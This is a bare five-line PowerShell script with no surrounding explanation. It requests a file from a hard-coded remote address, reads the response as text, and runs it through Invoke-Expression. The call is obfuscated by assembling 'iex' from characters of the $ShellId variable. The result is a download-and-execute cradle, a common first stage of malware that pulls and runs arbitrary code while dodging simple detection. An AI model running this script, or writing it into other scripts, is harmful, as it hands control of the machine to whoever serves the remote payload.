$u = "http://203.0.113.77:9090/abc123"
$r = [System.Net.WebRequest]::Create($u)
$s = $r.GetResponse().GetResponseStream()
$t = (New-Object System.IO.StreamReader($s)).ReadToEnd()
.($ShellId[1] + $ShellId[13] + 'x') $t
